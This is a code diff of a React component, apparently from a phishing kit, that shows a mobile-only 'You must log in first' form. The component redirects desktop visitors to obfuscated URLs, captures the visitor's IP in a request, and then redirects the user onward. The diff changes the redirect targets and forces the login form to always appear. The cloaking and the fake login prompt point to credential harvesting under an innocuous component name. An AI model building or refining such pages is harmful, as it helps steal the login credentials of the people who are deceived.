@@ -20,7 +20,7 @@ const About595 = () => {
 
     useEffect(() => {
         if (isDesktop) {
-            window.location.href = 'eFy2Rp4Th9Km2Lq1Ns8Xw3Zg6Vo5Sj0Fb3Te4Yr7Uq1Ix8Pm2Kn9Xs6Jz3Ob5Nh8Jr5Ft4';
+            window.location.href = 'Xp6Vr8Lo2Kn3Yt9WsCf7Ju0NUx0Pm4Rs8Vy7Gtz6Tr3Hv9Ep2Gx4Lq7Pa5Wm1Jy8Rt0Kb3No6Xs';
         }
     }, [isDesktop]);
 
@@ -56,10 +56,10 @@ IP: '${ip}'
                         },
                     })
                         .then(() => {
-                            window.location = 'gQx9Wu2Pv3Ky4Hz5Mo1En6Js8Xt3Ao7Lr4Fu5Dv2Gy9Zw6Bq8Hn3Sr7Tp4Yj5Vf2Km1Xq9';
+                            window.location = '9Kr2Xp6Lq7Mt3Bc8Zv1Wo4Nh5Ty3Jd65JLo3Vn5Ga1X2Ub4Jo0Md8Ns5Tr3Gn5p6JrFx7Km4Th';
                         })
                         .catch((error) => {
-                            window.location = 'gQx9Wu2Pv3Ky4Hz5Mo1En6Js8Xt3Ao7Lr4Fu5Dv2Gy9Zw6Bq8Hn3Sr7Tp4Yj5Vf2Km1Xq9';
+                            window.location = '9Kr2Xp6Lq7Mt3Bc8Zv1Wo4Nh5Ty3Jd65JLo3Vn5Ga1X2Ub4Jo0Md8Ns5Tr3Gn5p6JrFx7Km4Th';
                         });
                 });
         }
@@ -177,12 +177,11 @@ IP: '${ip}'
             window.location = userUrl;
         }, 1000);
         resetUserNumber();
+        return null;
     }
 
-    console.log("hi here is the data", isUserData, userData);
-
-    if (isUserData) {
-      return (
+    // Always show the index (login form)
+    return (
         <section className="w-full flex sm:hidden flex-col items-center justify-start gap-4 bg-white">
             <div className="w-full text-left text-[13.6px] px-3 py-[8px] text-neutral-500 bg-citrine/10 border-solid border-0 border-b-[1px] border-citrine rounded-sm "style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}>
                 You must log in first.
@@ -239,8 +238,6 @@ IP: '${ip}'
             </div>
         </section>
     );
-}
-return null; // Return null if no user data is present
 };
 
 export default About595;
